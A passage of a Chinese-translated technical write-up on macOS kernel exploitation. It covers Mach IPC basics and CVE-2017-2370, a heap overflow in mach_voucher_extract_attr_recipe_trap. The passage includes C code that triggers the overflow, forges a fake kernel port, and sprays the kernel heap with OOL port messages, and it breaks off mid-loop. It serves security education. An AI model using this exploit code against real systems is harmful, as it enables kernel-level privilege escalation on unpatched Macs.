# 【技术分享】OS X内核大揭秘之利用篇
|
##### 译文声明
本文是翻译文章，文章来源：theori.io
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
译者：[天鸽](http://bobao.360.cn/member/contribute?uid=145812086)
预估稿费：200RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
传送门
[【技术分享】OS X内核大揭秘之基础篇](http://bobao.360.cn/learning/detail/4501.html) ****
**  
**
**背景知识**
**OS X 中的进程间通信（IPC）**
由于 Mach 使用了客户端-服务器的系统架构，因此客户端可以通过请求服务器进行服务。在 macOS Mach 中，进程间通信通道的终端称为
port（端口），port 被授权可以使用该通道。以下是 Mach 提供的 IPC 类型。（但是，由于体系结构变化，在以前版本中可能无法使用的 macOS
的 IPOS）
    消息队列/信号量/通知/锁定集/ RPC
**关于 Mach port**
**Mach Port：** 与 UNIX 的单向管道类似，是由内核管理的消息队列。有多个发送方和一个接收方。
**Port 权限：** task 信息是系统资源的集合，也可以说是资源的所有权。这些 task 允许您访问 Port（发送，接收，发送一次），称为
Port 权限。（也就是说，Port 权限是 Mach 的基本安全机制。）
**发送权限：** 不受限制地将数据插入到特定的消息队列中
**一次发送权限：** 将单个消息数据插入到特定的消息队列中
**接收权限：** 不受限制地从特定消息队列中提取数据
**Port 集：** 一组有权限的端口，在接收来自其某个成员的消息或事件时，可以将其视为单个单元。
**Port 集权限：** 从多个消息队列中排除特定的消息队列
**Port 命名空间：** 每个操作都与单一的端口命名空间相关联，只有当该操作具有端口命名空间的权限时, 才能对该端口进行操作。
**Dead-Name 权限：** 不做任何事
**函数功能描述**
**kern_return_t mach_vm_allocate(vm_map_t target, mach_vm_address_t *address,
mach_vm_size_t size, int flags)：**
在 target 的 *address 地址处分配 size 大小的空间
**kern_return_t mach_vm_deallocate(vm_map_t target, mach_vm_address_t address,
mach_vm_size_t size)：**
在 target 的 address 地址处释放 size 大小的空间
**task_t mach_task_self()：**
将发送权限返回给发送者的 task_self 端口
**kern_return_t mach_port_allocate (ipc_space_t task, mach_port_right_t right,
mach_port_name_t *name)：**
创建指定类型的端口
**kern_return_t mach_port_insert_right (ipc_space_t task, mach_port_name_t
name, mach_port_poly_t right, mach_msg_type_name_t right_type)：**
授予进程端口权限
**mach_msg_return_t mach_msg (mach_msg_header_t msg, mach_msg_option_t option,
mach_msg_size_t send_size, mach_msg_size_t receive_limit, mach_port_t
receive_name, mach_msg_timeout_t timeout, mach_port_t notify)：**
从端口发送或接收消息
**kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t
address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t
*outsize)：**
按 size 大小读取与给定的 target_task 相同区域中的数据
**kern_return_t mach_vm_write(vm_map_t target_task, mach_vm_address_t address,
vm_offset_t data, mach_msg_type_number_t dataCnt)：**
写入与给定 target_task 相同区域中 address 处一样大的数据
**（1）堆溢出**
CVE-2017-2370 是在 macOS 10.12.2
及更早版本中的mach_voucher_extract_attr_recipe_trap（struct
mach_voucher_extract_attr_recipe_args * args）函数导致的堆溢出漏洞。
mach_voucher_extract_attr_recipe_args 的结构如下所示。
    struct mach_voucher_extract_attr_recipe_args {
        PAD_ARG_(mach_port_name_t, voucher_name);
        PAD_ARG_(mach_voucher_attr_key_t, key);
        PAD_ARG_(mach_voucher_attr_raw_recipe_t, recipe);
        PAD_ARG_(user_addr_t, recipe_size);
    };
    /* osfmk/mach/mach_traps.h */
    #define PAD_ARG_(arg_type, arg_name) 
      char arg_name ##_l_[PADL_(arg_type)];
      arg_type arg_name;
      char arg_name ##_r_[PADR_(arg_type)];
在调用 mach_voucher_extract_attr_recipe_trap() 传递参数时，可以任意操作
mach_voucher_extract_attr_recipe_args 结构体中的 mach_voucher_attr_raw_recipe_t
recipe 和 user_addr_t recipe_size 值。因此，该函数被复制到函数中由 void* kalloc(vm_size_t
size); 分配的内核堆区，并且由于该函数具有可操控的 args->recipe_size 而可能发生溢出。
特别地，由于可以操控 args->recipe，所以可以在溢出时创建任意数据。
Crash PoC 触发代码：
    /* ---- FROM exp.m ---- */
    uint64_t roundup(uint64_t val, uint64_t pagesize) {
        val += pagesize - 1;
        val &= ~(pagesize - 1);
        return val;
    }
    void heap_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overflow_data, mach_port_t* voucher_port) {
        int pagesize = getpagesize();
        void* recipe_size = (void*)map(pagesize);
        *(uint64_t*)recipe_size = kalloc_size;
        uint64_t actual_copy_size = kalloc_size + overflow_length;
        uint64_t alloc_size = roundup(actual_copy_size, pagesize) + pagesize;
        uint64_t base = map(alloc_size); // unmap page
        uint64_t end = base + roundup(actual_copy_size, pagesize);
        mach_vm_deallocate(mach_task_self(), end, pagesize); // for copyin() stop
        uint64_t start = end - actual_copy_size;
        uint8_t* recipe = (uint8_t*)start;
        memset(recipe, 0x41, kalloc_size); // set kalloc size
        memcpy(recipe + kalloc_size, overflow_data, overflow_length); // set overflow bytes
        kern_return_t err = mach_voucher_extract_attr_recipe_trap(voucher_port, 1, recipe, recipe_size); // Trigger
    }
    /* -------------------- */
    ---    mach_port_t* voucher_port = MACH_PORT_NULL;
    mach_voucher_attr_recipe_data_t atm_data = {
        .key = MACH_VOUCHER_ATTR_KEY_ATM,
        .command = MACH_VOUCHER_ATTR_ATM_CREATE
    };
    kern_return_t err = host_create_mach_voucher(mach_host_self(), (mach_voucher_attr_raw_recipe_array_t)&atm_data, sizeof(atm_data), &voucher_port);
    ipc_object* fake_port = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_port
    void* fake_task = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0); // alloc fake_task
    fake_port->io_bits = IO_BITS_ACTIVE | IKOT_CLOCK; // for clock trap
    fake_port->io_lock_data[12] = 0x11;
    printf("[+] Create Fake Port. Address : %llxn", (unsigned long long)fake_port);
    heap_overflow(0x100, 0x8, (unsigned char *)&fake_port, voucher_port);
**  
**
**（2）OOL Port 风水**
正如我之前在 OOL Port 系列博客中简要提到的，我使用 OOL Port 将数据放入内核堆并使用喷射和风水技术。这是因为 OOL Port
数据在内核中会保留到收到结束信号为止。
Port 风水的步骤简要说明如下：
**创建大量端口**
**消息生成（发送，接收）**
**创建一些用作地址的虚拟端口（MACH_PORT_DEAD）**
**发送消息**
**接收消息**
**重新发送消息**
当执行上述操作时，OS 在重复发送和接收的端口收集的地址周围分配数据。
使用的代码是：
    struct ool_send_msg{
        mach_msg_header_t msg_head;
        mach_msg_body_t msg_body;
        mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
    };
    struct ool_recv_msg{
        mach_msg_header_t msg_head;
        mach_msg_body_t msg_body;
        mach_msg_ool_ports_descriptor_t msg_ool_ports[16];
        mach_msg_trailer_t msg_trailer;
    };
    struct ool_send_msg send_msg;
    struct ool_recv_msg recv_msg;
    mach_port_t* ool_port_fengshui(){
        int current_port_num = 0;
        mach_port_t* ool_ports;
        ool_ports = calloc(PORT_COUNT, sizeof(mach_port_t));
        // Part 1. Create OOL Ports
        for(current_port_num = 0; current_port_num < PORT_COUNT; current_port_num++){ // Alloc 1024 Ports
            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ool_ports[current_port_num]); // Alloc Port
            mach_port_insert_right(mach_task_self(), ool_ports[current_port_num], ool_ports[current_port_num], MACH_MSG_TYPE_MAKE_SEND); // MACH_MSG_TYPE_MAKE_SEND Right Set.
        }
        // Part 2. Create Message Buffer (Spray)
        mach_port_t* use_ports = calloc(1024, sizeof(mach_port_t));
        for(int i = 0; i <= 1024; i++){
            use_ports[i] = MACH_PORT_DEAD;
        }
        /* Set MSG HEADER */
        send_msg.msg_head.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
        send_msg.msg_head.msgh_size = sizeof(struct ool_send_msg) - 16;
        send_msg.msg_head.msgh_remote_port = MACH_PORT_NULL;
        send_msg.msg_head.msgh_local_port = MACH_PORT_NULL; // NULL SEND
        send_msg.msg_head.msgh_reserved = 0x00;
        send_msg.msg_head.msgh_id = 0x00;
        /* SET MSG BODY */
        send_msg.msg_body.msgh_descriptor_count = 1;
        /* SET MSG OOL PORT DESCRIPTOR */
        for(int i = 0; i<=16; i++){ // appropriate ipc-send size  
            send_msg.msg_ool_ports[i].address = use_ports;
            send_msg.msg_ool_ports[i].count = 32; // kalloc 0x100 (256)
            send_msg.msg_ool_ports[i].deallocate = 0x00;
            send_msg.msg_ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
            send_msg.msg_ool_ports[i].disposition = MACH_MSG_TYPE_MAKE_SEND;
            send_msg.msg_ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        }
        // Part 3. Message Fengshui
        /* SEND MSG */
        for(current_port_num = 0; current_port_num < USE_PORT_START; current_port_num++){
            send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
            kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if(send_result != KERN_SUCCESS){
                printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
                exit(1);
            }
        }
        for(current_port_num = USE_PORT_END; current_port_num < PORT_COUNT; current_port_num++){
            send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
            kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if(send_result != KERN_SUCCESS){
                printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
                exit(1);
            }
        }
        for(current_port_num = USE_PORT_START; current_port_num < USE_PORT_END; current_port_num++){
            send_msg.msg_head.msgh_remote_port = ool_ports[current_port_num];
            kern_return_t send_result = mach_msg(&send_msg.msg_head, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, send_msg.msg_head.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
            if(send_result != KERN_SUCCESS){
                printf("[-] Error in OOL Fengshui sendnError : %sn", mach_error_string(send_result));
                exit(1);
            }
        }
        /* RECV MSG */
        for(current_port_num = USE_PORT_START; current_port_num < USE_PORT_END; current_port_num += 4){
            recv_msg.msg_head.msgh_local_port = ool_ports[current_port_num];